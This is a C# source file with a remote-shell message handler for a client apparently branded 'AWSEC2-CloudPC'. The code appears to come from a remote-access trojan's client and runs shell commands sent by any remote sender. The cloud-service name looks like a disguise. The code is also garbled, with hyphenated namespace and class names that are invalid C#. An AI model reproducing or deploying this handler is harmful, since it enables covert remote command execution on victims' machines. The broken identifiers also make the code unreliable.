using AWSEC2-CloudPC.Client.IO;
using AWSEC2-CloudPC.Client.Networking;
using AWSEC2-CloudPC.Common.Messages;
using AWSEC2-CloudPC.Common.Networking;
using System;

namespace AWSEC2-CloudPC.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote shell.
    /// </summary>
    public class RemoteShellHandler : IMessageProcessor, IDisposable
    {
        /// <summary>
        /// The current remote shell instance.
        /// </summary>
        private Shell _shell;

        /// <summary>
        /// The client which is associated with this remote shell handler.
        /// </summary>
        private readonly AWSEC2-CloudPCClient _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteShellHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteShellHandler(AWSEC2-CloudPCClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        /// <summary>
        /// Handles changes of the client state.
        /// </summary>
        /// <param name="s">The client which changed its state.</param>
        /// <param name="connected">The new connection state of the client.</param>
        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            // close shell on client disconnection
            if (!connected)
            {
                _shell?.Dispose();
            }
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoShellExecute;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShellExecute shellExec:
                    Execute(sender, shellExec);
                    break;
            }
        }

        private void Execute(ISender client, DoShellExecute message)
        {
            string input = message.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell(_client);

            if (input == "exit")
                _shell.Dispose();
            else
                _shell.ExecuteCommand(input);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _shell?.Dispose();
            }
        }
    }
}
